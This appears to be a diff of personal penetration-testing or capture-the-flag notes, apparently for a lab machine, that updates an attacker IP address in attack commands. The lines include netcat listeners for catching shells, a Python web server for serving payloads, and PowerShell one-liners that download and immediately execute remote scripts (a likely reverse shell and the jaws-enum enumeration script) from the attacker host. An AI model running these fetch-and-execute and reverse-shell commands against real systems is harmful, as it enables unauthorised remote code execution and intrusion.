@@ -3,6 +3,6 @@ nc -lnvp 53
 ./BigHeadSrv.py
 
 python -m SimpleHTTPServer + nc -lnvp 9001 to get powershell
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.13.157:8000/PowerShell.ps1')"
-powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.13.157:8000/jaws-enum.ps1')"
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.13.40:8000/PowerShell.ps1')"
+powershell "IEX (New-Object Net.WebClient).DownloadString('http://10.10.13.40:8000/jaws-enum.ps1')"
 
